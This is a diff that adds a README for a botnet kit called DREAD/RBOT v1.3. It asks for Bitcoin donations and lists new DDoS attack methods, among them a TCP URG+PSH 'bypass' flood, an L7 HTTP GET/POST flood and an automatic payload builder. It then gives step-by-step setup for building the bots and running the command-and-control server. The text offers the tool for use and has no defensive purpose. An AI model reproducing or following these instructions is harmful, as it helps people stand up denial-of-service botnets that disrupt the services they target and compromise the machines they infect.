@@ -1,0 +1,31 @@
+Donations are appreciated: bc1qk0aj03m7hvf8uvwkk30r5h08ftqaqhk9esanfv
+
+Sense the updated cnc is larger, it is recommended to use a server with:
+4g ram
+2 cores
+
+If you are not able to get a server with these minimum specs, remove lines 441-601 and 1285-1479 from the cnc.c file
+
+DREAD/RBOT v1.3
+-Added "BYPASS" Method (TCP URG+PSH Flood)
+-Added L7 HTTP GET/POST Flood
+-Added STOP attack function
+-Added Auto PAYLOAD Builder
+-FIXED RHEX Flood
+-Updated CNC
+
+Have fun.
+
+SUPER ez setup:
+
+1. Edit IP in main/bot.c (line 37) and cnc.c (line 1197) change to your server IP
+
+2. Add credentials to login.txt
+
+3. sh build.sh
+
+4. screen your c2: screen ./cnc 3074 2 1337
+
+5.Connect to the CNC using an ssh client like PuTTY
+Connection type: RAW
+Port: 1337
